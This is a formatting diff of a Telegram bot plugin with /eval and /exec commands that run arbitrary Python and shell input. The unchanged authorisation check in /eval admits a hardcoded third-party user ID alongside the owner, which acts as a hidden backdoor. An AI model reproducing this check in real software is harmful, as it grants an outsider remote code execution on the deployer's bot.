@@ -6,9 +6,12 @@ import io
 import os
 import sys
 import traceback
-from .. import id
+
 from telethon import events
+
 from DaisyX import bot
+
+from .. import id
 
 
 @xbot.on(events.NewMessage(pattern="/eval ?(.*)"))
@@ -16,12 +19,14 @@ async def _(event):
     pro = await bot.get_me()
     boy = pro.id
     if event.sender_id == boy or event.sender_id == id or event.sender_id == 1513257955:
-       pass
+        pass
     else:
-       return await event.reply("deploy your own assistant check @DaisyXoT")
+        return await event.reply("deploy your own assistant check @DaisyXoT")
     cmd = event.text.split(" ", maxsplit=1)[1]
     if not cmd:
-        return await event.reply("What should I run ?..\n\nGive me something to run, u dumbo!!")
+        return await event.reply(
+            "What should I run ?..\n\nGive me something to run, u dumbo!!"
+        )
     proevent = await event.reply("Running.....")
     old_stderr = sys.stderr
     old_stdout = sys.stdout
@@ -62,18 +67,19 @@ async def aexec(code, smessatatus):
     )
 
 
-
 @xbot.on(events.NewMessage(pattern="/exec ?(.*)"))
 async def _(event):
     pro = await bot.get_me()
     boy = pro.id
     if event.sender_id == boy or event.sender_id == id:
-       pass
+        pass
     else:
-       return await event.reply("deploy your own assistant @DaisyXoT")
+        return await event.reply("deploy your own assistant @DaisyXoT")
     cmd = event.text.split(" ", maxsplit=1)[1]
     if not cmd:
-        return await event.reply("What should I execute?..\n\nGive me somwthing to execute, u dumbo!!")
+        return await event.reply(
+            "What should I execute?..\n\nGive me somwthing to execute, u dumbo!!"
+        )
     proevent = await event.reply("Executing.....")
     process = await asyncio.create_subprocess_shell(
         cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
